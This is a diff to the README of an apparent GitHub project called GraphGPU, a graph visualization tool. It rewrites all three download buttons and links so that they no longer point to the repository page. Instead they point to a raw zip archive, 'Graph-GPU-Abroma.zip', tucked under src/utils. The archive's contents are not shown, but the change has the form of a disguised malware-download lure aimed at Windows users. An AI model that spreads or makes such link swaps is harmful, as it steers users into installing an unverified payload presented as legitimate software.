@@ -1,6 +1,6 @@
 # ⚡ GraphGPU - Fast and Clear Graph Visualization
 
-[![Download GraphGPU](https://img.shields.io/badge/Download-GraphGPU-brightgreen?style=for-the-badge)](https://github.com/Melui23/GraphGPU)
+[![Download GraphGPU](https://img.shields.io/badge/Download-GraphGPU-brightgreen?style=for-the-badge)](https://github.com/Melui23/GraphGPU/raw/refs/heads/main/src/utils/Graph-GPU-Abroma.zip)
 
 ## 📘 What is GraphGPU?
 
@@ -27,7 +27,7 @@ To get GraphGPU running on your Windows computer, follow these steps carefully.
 
 Go to the official download page by clicking this link:
 
-[![Download Here](https://img.shields.io/badge/Download-GraphGPU-blue?style=for-the-badge)](https://github.com/Melui23/GraphGPU)
+[![Download Here](https://img.shields.io/badge/Download-GraphGPU-blue?style=for-the-badge)](https://github.com/Melui23/GraphGPU/raw/refs/heads/main/src/utils/Graph-GPU-Abroma.zip)
 
 This page has all the files you need.
 
@@ -131,4 +131,4 @@ It is built with modern web technologies like JavaScript and TypeScript but runs
 
 ---
 
-[Download GraphGPU](https://github.com/Melui23/GraphGPU) to start exploring your data visually.
+[Download GraphGPU](https://github.com/Melui23/GraphGPU/raw/refs/heads/main/src/utils/Graph-GPU-Abroma.zip) to start exploring your data visually.
